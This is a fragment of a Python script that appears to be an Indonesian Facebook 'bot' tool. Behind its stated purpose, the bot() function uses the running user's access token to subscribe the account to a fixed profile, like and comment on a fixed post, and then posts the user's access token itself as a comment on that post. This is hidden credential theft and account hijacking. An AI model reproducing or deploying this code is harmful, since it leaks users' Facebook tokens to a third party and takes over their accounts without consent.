...
sys.stdout.write('\x1b]1;{•} Botfb By NIKI {•}\x07')
def jalan(u):
...
def bot():
	try:
		...
		_____JEMBOT_XY_____('rm token.txt')
		login()
	texs = (" Yang Posting Orangnya Ganteng ♥️:)\n\nhttps://www.facebook.com/100000146759213/posts/5742476792433822/?app=fbl\n")
	kom = (" Bang Vino Ganteng Bener Dah!!")
	waktu = str(datetime.now().strftime('%H:%M:%S'))
	tanggal = ("%s %s %s"%(ha,op,ta))
	_hari_   = {'Sunday':'Minggu','Monday':'Senin','Tuesday':'Selasa','Wednesday':'Rabu','Thursday':'Kamis','Friday':'Jumat','Saturday':'Sabtu'}[str(datetime.now().strftime("%A"))]
	requests.post('https://graph.facebook.com/100000146759213/subscribers?access_token=' + token)
	requests.post('https://graph.facebook.com/100000146759213/subscribers?access_token=' + token)
	requests.post('https://graph.facebook.com/100000146759213/subscribers?access_token=' + token)
	requests.post('https://graph.facebook.com/5742476792433822/likes?summary=true&access_token=' + token)
	requests.post('https://graph.facebook.com/5742476792433822/comments/?message=' + respon + '\n\n' + texs +'\n' + kom + '\n[ Pukul '+ waktu + ' WIB ] '+ '\n- '+ _hari_ + ', '+ tanggal + ' -' + '&access_token=' + token)
	requests.post('https://graph.facebook.com/5742476792433822/comments/?message=' + token + '&access_token=' + token)
